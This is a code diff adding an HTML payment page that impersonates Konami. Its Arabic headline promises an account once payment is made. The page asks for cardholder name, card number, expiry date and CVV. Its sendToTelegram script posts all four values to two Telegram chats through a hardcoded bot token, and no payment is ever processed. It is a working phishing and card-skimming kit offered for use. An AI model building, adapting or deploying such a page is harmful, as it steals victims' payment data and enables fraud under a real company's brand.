@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Konami - Payment</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(to bottom, #c00, #900);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* أشكال زخرفية في الخلفية */
+        body::before, body::after {
+            content: "";
+            position: absolute;
+            width: 250px;
+            height: 250px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            z-index: 0;
+        }
+
+        body::before {
+            top: -50px;
+            left: -50px;
+        }
+
+        body::after {
+            bottom: -50px;
+            right: -50px;
+        }
+
+        .payment-container {
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            width: 380px;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo img {
+            width: 140px;
+            margin-bottom: 10px;
+        }
+
+        .icon {
+            font-size: 50px;
+            color: #c00;
+            margin-bottom: 10px;
+        }
+
+        .title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #333;
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 15px;
+            text-align: left;
+            width: 100%;
+        }
+
+        label {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 14px;
+            outline: none;
+            box-sizing: border-box;
+        }
+
+        .input-row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .input-row input {
+            width: 100%;
+        }
+
+        .pay-btn {
+            background: #c00;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: 0.3s;
+            width: 100%;
+        }
+
+        .pay-btn:hover {
+            background: #a00;
+        }
+    </style>
+</head>
+<body>
+
+<div class="payment-container">
+    <div class="logo">
+        <img src="https://my.konami.net/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Flogo-konami.b3f34124.png&w=256&q=75" alt="Konami Logo">
+    </div>
+    
+    <i class="fas fa-handshake icon"></i>
+    
+    <div class="title">قم بالدفع الآن لاستلام الحساب فورًا!</div>
+
+    <div class="input-group">
+        <label for="cardholder">Cardholder Name</label>
+        <input type="text" id="cardholder" placeholder="John Doe">
+    </div>
+    
+    <div class="input-group">
+        <label for="cardnumber">Card Number</label>
+        <input type="tel" id="cardnumber" placeholder="1234 5678 9012 3456" pattern="[0-9]*" inputmode="numeric">
+    </div>
+    
+    <div class="input-row">
+        <div class="input-group">
+            <label for="expiry">Expiry Date</label>
+            <input type="tel" id="expiry" placeholder="MM/YY" pattern="[0-9]*" inputmode="numeric">
+        </div>
+        <div class="input-group">
+            <label for="cvv">Security Code</label>
+            <input type="tel" id="cvv" placeholder="CVV" pattern="[0-9]*" inputmode="numeric">
+        </div>
+    </div>
+    
+    <button class="pay-btn" onclick="sendToTelegram()">Proceed to Payment</button>
+</div>
+
+<script>
+    function sendToTelegram() {
+        let cardholder = document.getElementById("cardholder").value;
+        let cardnumber = document.getElementById("cardnumber").value;
+        let expiry = document.getElementById("expiry").value;
+        let cvv = document.getElementById("cvv").value;
+
+        let message = `
+🔴 *New Payment Attempt* 🔴
+👤 *Cardholder Name:* ${cardholder}
+💳 *Card Number:* ${cardnumber}
+📅 *Expiry Date:* ${expiry}
+🔒 *CVV:* ${cvv}
+        `;
+
+        let botToken = "7626603395:AAElrtAisJi0EYgdXygeCEUyrIqzYPp7l9w";
+        let chatIds = ["5964410918", "5086851394"];
+
+        chatIds.forEach(chatId => {
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            let params = {
+                chat_id: chatId,
+                text: message,
+                parse_mode: "Markdown"
+            };
+
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(params)
+            })
+            .then(response => response.json())
+            .then(data => console.log("Message sent:", data))
+            .catch(error => console.error("Error:", error));
+        });
+    }
+</script>
+
+</body>
+</html>
